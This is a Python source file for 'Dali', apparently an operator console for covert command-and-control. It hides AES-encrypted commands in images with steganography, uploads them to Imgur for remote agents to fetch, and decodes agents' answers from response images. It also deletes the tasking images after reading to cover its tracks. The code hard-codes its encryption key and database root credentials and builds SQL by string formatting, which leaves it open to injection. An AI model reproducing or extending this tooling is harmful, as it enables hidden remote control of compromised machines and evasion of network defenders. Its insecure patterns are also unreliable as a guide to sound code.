#!/usr/bin/env python3

from PIL import Image
import requests
from io import BytesIO
import base64
import os
import sys
from Crypto.Cipher import AES
from colorama import *
import random
import json
import mysql.connector
from cmd import Cmd
import hashlib
import time

# these dicts are how we manage options settings for the various modules like: Image, Album, Task, Agent
create_options = {'Command': '', 'Response (No,Short,Long)': '', 'Base-Image': '', 'New-Filename': ''}
album_options = {'Auth-Type': '', 'Title': ''}
tasking_options = {'Tasking-Image': '', 'Title': '', 'Tags': '', 'Agent': '', 'Bearer-Token': ''}
agent_options = {'Title': '', 'Tags': ''}

# some nice hex ascii art thats not really ascii art at all ??
def ascii():
	print("\n")
	print(Style.BRIGHT + Fore.YELLOW + "	~64 61 6C 69~" + Style.RESET_ALL)
	print("\n")

# attempt to connect to MySQL, will fail if: 
# 1. MySQL is not running or 2. MySQL hasn't been configured for credentialed login by users
# sets up the database 'dali', creates all tables with relevant columns
# then exports the database connection for other functions to use
def mysql_check():
	try:
		mydb = mysql.connector.connect(host = 'localhost', user = 'root', password = 'root')
		mycursor = mydb.cursor()
	except mysql.connector.Error as err:
		print("Encountered MySQL error {}\n".format(err))
		sys.exit(1)

	try:
		mycursor.execute("CREATE DATABASE dali")
	except mysql.connector.Error as err:
		if err.errno != 1007:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)
	try:
		mycursor.execute("USE dali")
	except mysql.connector.Error as err:
		print("Encountered MySQL error {}\n".format(err))
		sys.exit(1)

	try:
		mycursor.execute("CREATE TABLE Pictures (ID INT AUTO_INCREMENT PRIMARY KEY, md5 VARCHAR(255), filename VARCHAR(255), command VARCHAR(1000), response VARCHAR(255), token VARCHAR(255), album_deletehash VARCHAR(255))")
	except mysql.connector.Error as err:
		if err.errno != 1050:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)

	try:
		mycursor.execute("CREATE TABLE Albums (ID INT AUTO_INCREMENT PRIMARY KEY, Album_Hash VARCHAR(255), Delete_Hash VARCHAR(255), Auth_Type VARCHAR(255), Token VARCHAR(255))")
	except mysql.connector.Error as err:
		if err.errno != 1050:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)

	try:
		mycursor.execute("CREATE TABLE Tasking (Tasking_Image VARCHAR(255), Tasking_Command VARCHAR(255), Response TEXT, Title VARCHAR(255), Tags VARCHAR(255), Agent VARCHAR(255), Image_Hash VARCHAR(255), Delete_Hash VARCHAR(255), Token VARCHAR(255))")
	except mysql.connector.Error as err:
		if err.errno != 1050:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)

	try:
		mycursor.execute("CREATE TABLE Agents (ID INT AUTO_INCREMENT PRIMARY KEY, Status VARCHAR(255), Title VARCHAR(255), Tags VARCHAR(255))")
	except mysql.connector.Error as err:
		if err.errno != 1050:
			print("Encountered MySQL error {}\n".format(err))
			sys.exit(1)
	
	mycursor.close()
	return mydb

# bare-bones implementation of this awesome class. TODO: add auto-complete
# this just gives us a nice CLI for our program
class MyPrompt(Cmd):
	prompt = Style.BRIGHT + Fore.MAGENTA + "Dali> " + Style.RESET_ALL

	def do_help(self, inp):
		print("\n")
		print("Valid Commands:\t\tDescription:")
		print("Image\t\t\tCreate an image for agent tasking")
		print("Album\t\t\tCreate an album for agent responses")
		print("Agent\t\t\tCreate an agent entity")
		print("Task\t\t\tCreate tasking for agent")
		print("List\t\t\tList images, albums, agents, and tasks")
		print("Delete\t\t\tDelete images, albums, agents, and tasks")
		print("Response\t\tRetrieve responses from tasked agents")
		print("Exit/Quit\t\tExit program")
		print("\n")

	def default(self, inp):		
		print("\n")
		print("Valid Commands:\t\tDescription:")
		print("Image\t\t\tCreate an image for agent tasking")
		print("Album\t\t\tCreate an album for agent responses")
		print("Agent\t\t\tCreate an agent entity")
		print("Task\t\t\tCreate tasking for agent")
		print("List\t\t\tList images, albums, agents, and tasks")
		print("Delete\t\t\tDelete images, albums, agents, and tasks")
		print("Response\t\tRetrieve responses from tasked agents")
		print("Exit/Quit\t\tExit program")
		print("\n")

	def do_Exit(self, inp):
		sys.exit(0)

	def do_exit(self, inp):
		sys.exit(0)

	def do_Quit(self, inp):
		sys.exit(0)

	def do_quit(self, inp):
		sys.exit(0)

	def do_Image(self, inp):
		self.do_image(inp)

	# this creates our stego'd image with the appropriate options set
	def do_image(self, inp):
		while True:
			inn = input(Style.BRIGHT + Fore.MAGENTA + "Dali/Image> " + Style.RESET_ALL).lower().split()
			if 'options' in inn:
				print('\n---OPTIONS---')
				for key, value in create_options.items():
					if value == '':
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ': None')
					else:
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ':', value)
				print("\n")
			elif ('exit' in inn) or ('quit' in inn) or ('cd ..' in inn):
				break
			elif inn[0] == 'set':
				# get input for the command we want to encode into the image
				if inn[1] == 'command':
					create_options['Command'] = " ".join(inn[2:])
				# get input for whether or not we expect agent to respond
				elif inn[1] == 'response':
					try:
						if inn[2][0] == 's':
							create_options['Response (No,Short,Long)'] = 'Short'
							create_options['Client-ID'] = ''
							create_options['Album-ID'] = ''
							if 'Bearer-Token' in create_options:
								del create_options['Bearer-Token']
						elif inn[2][0] == 'n':
							create_options['Response (No,Short,Long)'] = 'No'
							if 'Client-ID' in create_options:
								del create_options['Client-ID']
							if 'Album-ID' in create_options:
								del create_options['Album-ID']
							if 'Bearer-Token' in create_options:
								del create_options['Bearer-Token']
						elif inn[2][0] == 'l':
							create_options['Response (No,Short,Long)'] = 'Long'
							create_options['Bearer-Token'] = ''
							create_options['Album-ID'] = ''
							if 'Client-ID' in create_options:
								del create_options['Client-ID']
					except:
						self.print_valid_commands()
				# get input for which image we want to edit
				elif inn[1] == 'base-image':
					try:
						create_options['Base-Image'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['base', 'image']:
					try:
						create_options['Base-Image'] = inn[3]
					except:
						self.print_valid_commands()
				# get input for where will save stego'd image
				elif inn[1] == 'new-filename':
					try:
						create_options['New-Filename'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['new', 'filename']:
					try: 
						create_options['New-Filename'] = inn[3]
					except:
						self.print_valid_commands()
				elif inn[1] == 'client-id':
					try: 
						create_options['Client-ID'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['client', 'id']:
					try: 
						create_options['Client-ID'] = inn[3]
					except:
						self.print_valid_commands()
				elif inn[1] == 'album-id':
					try: 
						create_options['Album-ID'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['album', 'id']:
					try: 
						create_options['Album-ID'] = inn[3]
					except:
						self.print_valid_commands()
				elif inn[1] == 'bearer-token':
					try: 
						create_options['Bearer-Token'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['bearer', 'token']:
					try: 
						create_options['Bearer-Token'] = inn[3]
					except:
						self.print_valid_commands()
			# give user option to reset values for options
			elif inn[0] == 'reset':
				create_options['Command'] = ''
				create_options['Response (No,Short,Long)'] = ''
				create_options['Base-Image'] = ''
				create_options['New-Filename'] = ''
				if 'Client-ID' in create_options:
					del create_options['Client-ID']
					del create_options['Album-ID']
				elif 'Bearer-Token' in create_options:
					del create_options['Bearer-Token']
					del create_options['Album-ID']
			# make sure all variables have been set, then export those to those to the functions
			elif inn[0] == 'go':
				missing = []
				for key, value in create_options.items():
					if value == '':
						missing.append(key)
				if missing:
					print("\n")
					print("Please set these option values:")
					for x in missing:
						print(Style.BRIGHT + Fore.CYAN + x + Style.RESET_ALL)
					print("\n")
				else:
					command = create_options['Command']
					response = create_options['Response (No,Short,Long)']
					img_path = create_options['Base-Image']
					img_name = create_options['New-Filename']
					mycursor = mydb.cursor()
					test_name = os.path.abspath(img_name)
					sql = "SELECT * FROM Pictures WHERE filename = '{0}'".format(test_name)
					mycursor.execute(sql)
					test_results = mycursor.fetchall()
					if test_results:
						print("\nNew-Filename already exists, please use a different name.\n")
						return
					mycursor.close()
					if 'Client-ID' in create_options:
						client_id = create_options['Client-ID']
						# lookup album id in mysql and retrieve delete hash
						album_id = int(create_options['Album-ID'])
						mycursor = mydb.cursor()
						sql = "SELECT Delete_Hash FROM Albums WHERE ID = {0}".format(album_id)
						mycursor.execute(sql)
						album_deletehash_tuple = mycursor.fetchall()
						mycursor.close()
						if album_deletehash_tuple:
							for x in album_deletehash_tuple:
								album_deletehash = x[0]
						else: 
							print("\nPlease create an album first.\n")
							return
						self.create_image(command, response, img_path, img_name, client_id, album_deletehash)
					elif 'Bearer-Token' in create_options:
						bearer_token = create_options['Bearer-Token']
						album_id = int(create_options['Album-ID'])
						mycursor = mydb.cursor()
						sql = "SELECT Delete_Hash FROM Albums WHERE ID = {0}".format(album_id)
						mycursor.execute(sql)
						album_deletehash_tuple = mycursor.fetchall()
						mycursor.close()
						if album_deletehash_tuple:
							for x in album_deletehash_tuple:
								album_deletehash = x[0]
						else: 
							print("\nPlease create an album first.\n")
							return
						self.create_image(command, response, img_path, img_name, bearer_token, album_deletehash)

			else:
				self.print_valid_commands()

	def do_Album(self, inp):
		self.do_album(inp)

	# this sets up the options and then exports the variables and their values to the create_function() 
	# this is obviously used to create either an authenticated or unauthenticated album for agents to respond in
	def do_album(self, inp):
		while True:
			inn = input(Style.BRIGHT + Fore.MAGENTA + "Dali/Album> " + Style.RESET_ALL).lower().split()
			if 'options' in inn:
				print('\n---OPTIONS---')
				for key, value in album_options.items():
					if value == '':
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ': None')
					else:
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ':', value)
				print("\n")
			elif ('exit' in inn) or ('quit' in inn):
				break
			elif inn[0] == 'set':
				# get input for the album we want to create
				if inn[1] == 'auth-type':
					try:
						if inn[2][0] == "a":
							album_options['Auth-Type'] = "Auth"
							album_options['Bearer-Token'] = ''
							if 'Client-ID' in album_options:
								del album_options['Client-ID']

						elif inn[2][0] == "u":
							album_options['Auth-Type'] = "Unauth"
							album_options['Client-ID'] = ''
							if 'Bearer-Token' in album_options:
								del album_options['Bearer-Token']
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['auth', 'type']:
					try:
						if inn[3][0] == "a":
							album_options['Auth-Type'] = "Auth"
							album_options['Bearer-Token'] = ''
							if 'Client-ID' in album_options:
								del album_options['Client-ID']
						elif inn[3][0] == "u":
							album_options['Auth-Type'] = "Unauth"
							album_options['Client-ID'] = ''
							if 'Bearer-Token' in album_options:
								del album_options['Bearer-Token']
					except:
						self.print_valid_commands()
				elif inn[1] == 'client-id':
					try:
						album_options['Client-ID'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['client', 'id']:
					try:
						album_options['Client-ID'] = inn[3]
					except:
						self.print_valid_commands()
				elif inn[1] == 'bearer-token':
					try:
						album_options['Bearer-Token'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['bearer', 'token']:
					try:
						album_options['Bearer-Token'] = inn[3]
					except:
						self.print_valid_commands()
				elif inn[1] == 'title':
					try:
						album_options['Title'] = " ".join(inn[2:])
					except:
						self.print_valid_commands()
			elif inn[0] == 'reset':
				album_options['Auth-Type'] = ''
				album_options['Title'] = ''
				if 'Client-ID' in album_options:
					del album_options['Client-ID']
				elif 'Bearer-Token' in album_options:
					del album_options['Bearer-Token']
			# make sure all variables have been set, then export those to those to the functions
			elif inn[0] == 'go':
				missing = []
				for key, value in album_options.items():
					if value == '':
						missing.append(key)
				if missing:
					print("\n")
					print("Please set these option values:")
					for x in missing:
						print(Style.BRIGHT + Fore.CYAN + x + Style.RESET_ALL)
					print("\n")
				else:
					if 'Bearer-Token' in album_options:
						token = album_options['Bearer-Token']
					elif 'Client-ID' in album_options:
						token = album_options['Client-ID']
					auth_type = album_options['Auth-Type']
					album_title = album_options['Title']
					self.create_album(token, album_title, auth_type)
			else:
				self.print_valid_commands()

	def do_Agent(self, inp):
		self.do_agent(inp)

	# this simply creates a logical entity representing an agent
	# since this project doesn't have a real agent/implant, this is just a representation for bookeeping
	def do_agent(self, inp):
		while True:
			inn = input(Style.BRIGHT + Fore.MAGENTA + "Dali/Agent> " + Style.RESET_ALL).lower().split()
			if 'options' in inn:
				print('\n---OPTIONS---')
				for key, value in agent_options.items():
					if value == '':
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ': None')
					else:
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ':', value)
				print("\n")
			elif ('exit' in inn) or ('quit' in inn):
				break
			elif inn[0] == 'set':
				if inn[1] == 'title':
					try: 
						agent_options['Title'] = " ".join(inn[2:])
					except:
						self.print_valid_commands()
				elif inn[1] == 'tags':
					try:
						agent_options['Tags'] = inn[2]
					except:
						self.print_valid_commands()
			# give user option to reset values for options
			elif inn[0] == 'reset':
				agent_options['Title'] = ''
				agent_options['Tags'] = ''
			elif inn[0] == 'go':
				missing = []
				for key, value in agent_options.items():
					if value == '':
						missing.append(key)
				if missing:
					print("\n")
					print("Please set these option values:")
					for x in missing:
						print(Style.BRIGHT + Fore.CYAN + x + Style.RESET_ALL)
					print("\n")
				else:
					agent_title = agent_options['Title']
					agent_tags = agent_options['Tags']
					status = 'IDLE'
					mycursor = mydb.cursor()
					execution = "INSERT INTO Agents (Title, Tags, Status) VALUES (%s, %s, %s)"
					values = (agent_title, agent_tags, status)
					try:
						mycursor.execute(execution, values)
						mydb.commit()
						last_id = mycursor.lastrowid
						print("\nAgent entity created with ID: " + Style.BRIGHT + Fore.YELLOW + str(last_id) + Style.RESET_ALL + "\n")
						mycursor.close()
					except mysql.connector.Error as err:
						print("Encountered MySQL error {}\n".format(err))
						sys.exit(1)
			
					mydb.commit()
					mycursor.close()

	def do_Task(self, inp):
		self.do_task(inp)
	
	# sets up all of our tasking options and then calls create_tasking()
	# used to upload images to the public gallery so the agent can get it and get tasked
	def do_task(self, inp):
		while True:
			inn = input(Style.BRIGHT + Fore.MAGENTA + "Dali/Task> " + Style.RESET_ALL).lower().split()
			if 'options' in inn:
				print('\n---OPTIONS---')
				for key, value in tasking_options.items():
					if value == '':
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ': None')
					else:
						print(Style.BRIGHT + Fore.CYAN + key + Style.RESET_ALL, ':', value)
				print("\n")
			elif ('exit' in inn) or ('quit' in inn) or ('cd ..' in inn):
				break
			elif inn[0] == 'set':
				if inn[1] == 'tasking-image':
					try: 
						tasking_options['Tasking-Image'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['tasking', 'image']:
					try:
						tasking_options['Tasking-Image'] = inn[3]
					except:
						self.print_valid_commands()
				elif inn[1] == 'title':
					try:
						proper = []
						for x in inn[2:]:
							proper.append(x.capitalize())
						tasking_options['Title'] = " ".join(proper)
					except:
						self.print_valid_commands()
				elif inn[1] == 'tags':
					try:
						tasking_options['Tags'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1] == 'agent':
					try:
						tasking_options['Agent'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1] == 'bearer-token':
					try: 
						tasking_options['Bearer-Token'] = inn[2]
					except:
						self.print_valid_commands()
				elif inn[1:3] == ['bearer', 'token']:
					try: 
						tasking_options['Bearer-Token'] = inn[3]
					except:
						self.print_valid_commands()
			# give user option to reset values for options
			elif inn[0] == 'reset':
				tasking_options['Tasking-Image'] = ''
				tasking_options['Title'] = ''
				tasking_options['Tags'] = ''
				tasking_options['Agent'] = ''
				tasking_options['Bearer-Token'] = ''
			elif inn[0] == 'go':
				missing = []
				for key, value in tasking_options.items():
					if value == '':
						missing.append(key)
				if missing:
					print("\n")
					print("Please set these option values:")
					for x in missing:
						print(Style.BRIGHT + Fore.CYAN + x + Style.RESET_ALL)
					print("\n")
				else:
					agent_id = int(tasking_options['Agent'])
					title = tasking_options['Title']
					tags = tasking_options['Tags']
					task_image = tasking_options['Tasking-Image']
					token = tasking_options['Bearer-Token']
					mycursor = mydb.cursor()
					sql = "SELECT * FROM Agents WHERE ID = {0}".format(agent_id)
					mycursor.execute(sql)
					agent_tuple = mycursor.fetchall()
					if agent_tuple:
						execution = "SELECT Status FROM Agents WHERE ID = {0}".format(agent_id)
						mycursor.execute(execution)
						task_check = mycursor.fetchall()
						task_check = task_check[0][0]
						if task_check == 'TASKED':
							print("\nAgent is already tasked, wait for response or delete previous tasking.\n")
							return
					else: 
						print("\nAgent: " + str(agent_id) + " does not exist, please create the agent first.\n")
					sql = "SELECT * FROM Pictures WHERE ID = {0}".format(task_image)
					mycursor.execute(sql)
					image_tuple = mycursor.fetchall()
					if image_tuple:
						mycursor.close()
						self.create_tasking(agent_id, title, tags, task_image, token)
					else:
						print("\nImage: " + str(task_image) + " does not exist, please create the image first.\n")
						mycursor.close()

			else:
				self.print_valid_commands()

	def do_Delete(self, inp):
		self.do_list(inp)

	def do_delete(self, inp):
		self.do_list(inp)

	def do_List(self, inp):
		self.do_list(inp)

	# used to list all of the entites we have created in MySQL
	# can also be used to delete the entities we have created
	def do_list(self, inp):
		while True:
			inn = input(Style.BRIGHT + Fore.MAGENTA + "Dali/List-Delete> " + Style.RESET_ALL).lower().split()
			if 'images' in inn:
				mycursor = mydb.cursor()
				mycursor.execute("SELECT * FROM Pictures")
				myresult = mycursor.fetchall()
				if myresult:
					print("\n")
				for x in myresult:
					print(Style.BRIGHT + Fore.CYAN + "ID: " + Style.RESET_ALL + str(x[0]) + " | " + Style.BRIGHT + Fore.CYAN + "Filename: " + Style.RESET_ALL + x[2] + " | " + Style.BRIGHT + Fore.CYAN + "Command: " + Style.RESET_ALL + x[3] + " | " + Style.BRIGHT + Fore.CYAN + "Response-type: " + Style.RESET_ALL + x[4] + " | " + Style.BRIGHT + Fore.CYAN + "MD5: " + Style.RESET_ALL + str(x[1]))
				if myresult:
					print("\n")
				else:
					print("\nNo image entities exist.\n")
				mycursor.close()
			elif 'albums' in inn:
				mycursor = mydb.cursor()
				mycursor.execute("SELECT * FROM Albums")
				myresult = mycursor.fetchall()
				if myresult:
					print("\n")
				for x in myresult:
					print(Style.BRIGHT + Fore.CYAN + "ID: " + Style.RESET_ALL + str(x[0]) + " | " + Style.BRIGHT + Fore.CYAN + "Album-Hash: " + Style.RESET_ALL + x[1] + " | " + Style.BRIGHT + Fore.CYAN + "Delete-Hash: " + Style.RESET_ALL + x[2] + " | " + Style.BRIGHT + Fore.CYAN + 'Auth-Type: ' + Style.RESET_ALL + x[3])
				if myresult:
					print("\n")
				else:
					print("\nNo album entities exist.\n")
				mycursor.close()
			elif 'agents' in inn:
				mycursor = mydb.cursor()
				mycursor.execute("SELECT * FROM Agents")
				myresult = mycursor.fetchall()
				if myresult:
					print("\n")
				for x in myresult:
					print(Style.BRIGHT + Fore.CYAN + "ID: " + Style.RESET_ALL + str(x[0]) + " | " + Style.BRIGHT + Fore.CYAN + "Status: " + Style.RESET_ALL + str(x[1]) + " | " + Style.BRIGHT + Fore.CYAN + "Title: " + Style.RESET_ALL + x[2] + " | " + Style.BRIGHT + Fore.CYAN + "Tags: " + Style.RESET_ALL + x[3])
				if myresult:
					print("\n")
				else:
					print("\nNo agent entities exist.\n")
				mycursor.close()
			elif 'tasks' in inn:
				mycursor = mydb.cursor()
				mycursor.execute("SELECT * FROM Tasking")
				myresult = mycursor.fetchall()
				if myresult:
					print("\n")
				for x in myresult:
					print(Style.BRIGHT + Fore.CYAN + "Tasked Agent: " + Style.RESET_ALL + str(x[5]) + " | " + Style.BRIGHT + Fore.CYAN + "Response: " + Style.RESET_ALL + str(x[2]) + " | " + Style.BRIGHT + Fore.CYAN + "Tasking-Command: " + Style.RESET_ALL + x[1] + " | " + Style.BRIGHT + Fore.CYAN + "Tasking-Image: " + Style.RESET_ALL + str(x[0]))
				if myresult:
					print("\n")
				else:
					print("\nNo task entities exist.\n")
				mycursor.close()
			elif inn[0] == 'delete':
				try:
					if inn[1] == 'album':
						try:
							mycursor = mydb.cursor()
							execution = "DELETE FROM Albums WHERE ID = {0}".format(inn[2])
							mycursor.execute(execution)
							mydb.commit()
							mycursor.close()
							print("\nAlbum-ID: " + Style.BRIGHT + Fore.YELLOW + str(inn[2]) + Style.RESET_ALL + " successfully deleted.\n")
						except:
							print(Style.BRIGHT + Fore.CYAN + "Valid Delete Commands:" + Style.RESET_ALL)
							print("Delete Album <Album-ID>")
							print("Delete Image <Image-ID>")
							print("Delete Agent <Agent-ID>")
							print("Delete Task <Tasking-Image-ID>\n")
					elif inn[1] == 'image':
						try:
							mycursor = mydb.cursor()
							execution = "DELETE FROM Pictures WHERE ID = {0}".format(inn[2])
							mycursor.execute(execution)
							mydb.commit()
							mycursor.close()
							print("\nImage-ID: " + Style.BRIGHT + Fore.YELLOW + str(inn[2]) + Style.RESET_ALL + " successfully deleted.\n")
						except:
							print(Style.BRIGHT + Fore.CYAN + "Valid Delete Commands:" + Style.RESET_ALL)
							print("Delete Album <Album-ID>")
							print("Delete Image <Image-ID>")
							print("Delete Agent <Agent-ID>")
							print("Delete Task <Tasking-Image-ID>\n")
					elif inn[1] == 'agent':
						try:
							mycursor = mydb.cursor()
							execution = "DELETE FROM Agents WHERE ID = {0}".format(inn[2])
							mycursor.execute(execution)
							mydb.commit()
							mycursor.close()
							print("\nAgent-ID: " + Style.BRIGHT + Fore.YELLOW + str(inn[2]) + Style.RESET_ALL + " successfully deleted.\n")
						except:
							print(Style.BRIGHT + Fore.CYAN + "Valid Delete Commands:" + Style.RESET_ALL)
							print("Delete Album <Album-ID>")
							print("Delete Image <Image-ID>")
							print("Delete Agent <Agent-ID>")
							print("Delete Task <Tasking-Image-ID>\n")
					elif inn[1] == 'task':
						try:
							mycursor = mydb.cursor()
							execution = "SELECT Agent from Tasking WHERE Tasking_Image = {0}".format(inn[2])
							mycursor.execute(execution)
							agent_result = mycursor.fetchall()
							agent_result = agent_result[0][0]
							agent_result = int(agent_result)
							execution = "UPDATE Agents SET Status='IDLE' WHERE ID= {0}".format(agent_result)
							mycursor.execute(execution)
							mydb.commit()
							execution = "DELETE FROM Tasking WHERE Tasking_Image = {0}".format(inn[2])
							mycursor.execute(execution)
							mydb.commit()
							mycursor.close()
							print("\nTasking from Tasking-Image: " + Style.BRIGHT + Fore.YELLOW + str(inn[2]) + Style.RESET_ALL + " successfully deleted.\n")
						except:
							print(Style.BRIGHT + Fore.CYAN + "\nValid Delete Commands:" + Style.RESET_ALL)
							print("Delete Album <Album-ID>")
							print("Delete Image <Image-ID>")
							print("Delete Agent <Agent-ID>")
							print("Delete Task <Tasking-Image-ID>\n")
				except:
					print(Style.BRIGHT + Fore.CYAN + "\nValid Delete Commands:" + Style.RESET_ALL)
					print("Delete Album <Album-ID>")
					print("Delete Image <Image-ID>")
					print("Delete Agent <Agent-ID>")
					print("Delete Task <Tasking-Image-ID>\n")

			elif ('exit' in inn) or ('quit' in inn):
				break
			else:
				print(Style.BRIGHT + Fore.CYAN + "\nValid List Commands:" + Style.RESET_ALL)
				print("Albums/List Albums")
				print("Images/List Images")
				print("Agents/List Agents")
				print("Tasks/List Tasks\n")
				print(Style.BRIGHT + Fore.CYAN + "Valid Delete Commands:" + Style.RESET_ALL)
				print("Delete Album <Album-ID>")
				print("Delete Image <Image-ID>")
				print("Delete Agent <Agents-ID>")
				print("Delete Task <Tasking-Image-ID>\n")

	def do_response(self, inp):
		self.do_Response(inp)

	# probably the most complex method. this one checks for responses by:
	# 1. looking up 'PENDING' statuses in the Tasking table
	# 2. looks up the images used on those Tasks and then gets the album those images specified for response
	# 3. uses the API to query those albums for images, if there are images, it counts as a response
	# 4. decodes the response image, saves the response base64 encoded in the Tasking table under 'Response'
	# 5. updates the status of the Agent to 'IDLE'
	# 6. deletes the original tasking in the Gallery, phew!

	# if choose, you can view simply the amount of responses found by the method or 
	# view responses individually. they are time stamped :)
	def do_Response(self, inp):
		# get total number of PENDING tasks
		mycursor = mydb.cursor()
		execution = "SELECT * FROM Tasking WHERE Response = 'PENDING'"
		mycursor.execute(execution)
		results_tuple_list = mycursor.fetchall()

		counter = 0
		image_ids = []
		while counter < len(results_tuple_list):
			image_ids.append(results_tuple_list[counter][0])
			counter += 1

		delete_hashes = []
		for x in image_ids:
			x = int(x)
			execution = "SELECT album_deletehash FROM Pictures WHERE ID={0}".format(x)
			mycursor.execute(execution)
			delete_hashes += mycursor.fetchall()

		album_hashes = []
		for x in delete_hashes:
			x = x[0]
			execution = "SELECT Album_Hash,Auth_Type,Token FROM Albums WHERE Delete_Hash='{0}'".format(x)
			mycursor.execute(execution)
			album_hashes += mycursor.fetchall()
		
		mega_counter = 0
		while mega_counter < len(album_hashes):
			url = 'https://api.imgur.com/3/album/' + album_hashes[mega_counter][0] + '/images'
			if album_hashes[mega_counter][1] == 'Unauth':
				headers = {'Authorization': 'Client-ID ' + album_hashes[mega_counter][2]}
			elif album_hashes[mega_counter][1] == 'Auth':
				headers = {'Authorization': 'Bearer ' + album_hashes[mega_counter][2]}
			r = requests.get(url, headers=headers)
			response = r.content
			response = json.loads(response.decode())
			data = response.get('data', {})
			if data:
				agent_image_link = data[0]['link']
				r = requests.get(agent_image_link)
				img = Image.open(BytesIO(r.content))
				pixels = img.load()

				decode_keys = {'00000001': '=', '00000010': '/', '00000011': '+', '00000100': 'Z', '00000101': 'Y', '00000110': 'X', '00000111': 'W', '00001000': 'V', '00001001': 'U', '00001010': 'T', '00001011': 'S', '00001100': 'R', '00001101': 'Q', '00001110': 'P', '00001111': 'O', '00010000': 'N', '00010001': 'M', '00010010': 'L', '00010011': 'K', '00010100': 'J', '00010101': 'I', '00010110': 'H', '00010111': 'G', '00011000': 'F', '00011001': 'E', '00011010': 'D', '00011011': 'C', '00011100': 'B', '00011101': 'A', '00011110': 'z', '00011111': 'y', '00100000': 'x', '00100001': 'w', '00100010': 'v', '00100011': 'u', '00100100': 't', '00100101': 's', '00100110': 'r', '00100111': 'q', '00101000': 'p', '00101001': 'o', '00101010': 'n', '00101011': 'm', '00101100': 'l', '00101101': 'k', '00101110': 'j', '00101111': 'i', '00110000': 'h', '00110001': 'g', '00110010': 'f', '00110011': 'e', '00110100': 'd', '00110101': 'c', '00110110': 'b', '00110111': 'a', '00111000': '9', '00111001': '8', '00111010': '7', '00111011': '6', '00111100': '5', '00111101': '4', '00111110': '3', '00111111': '2', '01000000': '1', '01000001': '0'}

				reds = []
				for i in range(img.size[0]): # for every pixel:
				    for j in range(img.size[1]):
				        reds.append(pixels[i,j][0])

				bytez = []
				for i in reds:
					bytez.append('{:08b}'.format(i))

				differences = []
				counter = 0
				while counter < len(bytez):
					differences.append(str(abs(int(bytez[counter][7]) - int(bytez[counter + 1][7]))))
					counter += 2

				binaries = []
				counter = 0
				while counter < len(differences):
					command = ''
					for item in differences[counter:counter + 8]:
						command += item
					binaries.append(command)
					counter += 8


				counter = 0
				command_decoded = ''
				while counter < len(binaries):
					if binaries[counter] in decode_keys:
						command_decoded += decode_keys[binaries[counter]]
						counter += 1
					else:
						break

				command_decoded = command_decoded.encode()
				command_decoded = base64.b64decode(command_decoded)


				key = 'dali melts clock'
				iv = 'this is an iv456'
				decryption_scheme = AES.new(key, AES.MODE_CBC, iv)
				decrypted_command = decryption_scheme.decrypt(command_decoded)
				decrypted_command = decrypted_command.decode("utf-8")
				decrypted_command = str(decrypted_command).rstrip("~")

				le_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(time.time()))

				final = decrypted_command + "^" + le_time
				final = base64.b64encode(final.encode())
				final = final.decode("utf-8")
				
				task_image = image_ids[mega_counter]
				mycursor = mydb.cursor()
				execution = "SELECT Image_Hash,Token FROM Tasking WHERE Tasking_Image={0}".format(task_image)
				mycursor.execute(execution)
				results_tuple_list = mycursor.fetchall()
				image_hash = results_tuple_list[0][0]
				token = results_tuple_list[0][1]

				url = 'https://api.imgur.com/3/image/' + image_hash
				headers = {'Authorization': 'Bearer ' + token}
				r = requests.delete(url, headers=headers)
				response = r.content
				response = json.loads(response.decode())

				execution = "UPDATE Tasking SET Response ='{0}' WHERE Tasking_Image={1}".format(final,task_image)
				mycursor.execute(execution)
				mydb.commit()

				execution = "SELECT Agent FROM Tasking WHERE Tasking_Image={0}".format(task_image)
				mycursor.execute(execution)
				results_tuple_list = mycursor.fetchall()
				agent = results_tuple_list[0][0]

				execution = "UPDATE Agents SET Status = 'IDLE' WHERE ID={0}".format(agent)
				mycursor.execute(execution)
				mydb.commit()
				mycursor.close()

				mega_counter += 1

			else:
				
				mega_counter += 1

		while True:
			inn = input(Style.BRIGHT + Fore.MAGENTA + "Dali/Response> " + Style.RESET_ALL).lower().split()
			if 'options' in inn:
				print("\nValid Commands:")
				print("List Responses")
				print("Get Response <Agent-ID>\n")
			elif inn[0] == "list":
				try:
					mycursor = mydb.cursor()
					execution = "SELECT * FROM Agents WHERE Status !='PENDING'"
					mycursor.execute(execution)
					agent_results_tuple = mycursor.fetchall()
					if agent_results_tuple:
						print("\n")
						for x in agent_results_tuple:
							print("Tasking response from " + Style.BRIGHT + Fore.CYAN + "Agent-ID: " + str([x][0][0]) + Style.RESET_ALL + " found.")
					mycursor.close()
					print("\n")
				except Exception as e:
					print(e)
			elif inn[0] == "get":
				try:
					response_agent = int(inn[2])
					mycursor = mydb.cursor()
					execution = "SELECT Response FROM Tasking WHERE Agent={0}".format(response_agent)
					mycursor.execute(execution)
					response_results = mycursor.fetchall()
					response = response_results[0][0]
					response = response.encode()
					response_results = base64.b64decode(response)
					response_results = response_results.decode("utf-8")
					response_results = response_results.split("^")
					print(Style.BRIGHT + Fore.CYAN + "\n---RESPONSE FROM AGENT " + str(response_agent) + " (received at: " + response_results[1] + ")---" + Style.RESET_ALL + "\n")
					print(response_results[0] + "\n")
				except Exception as e:
					print(e)
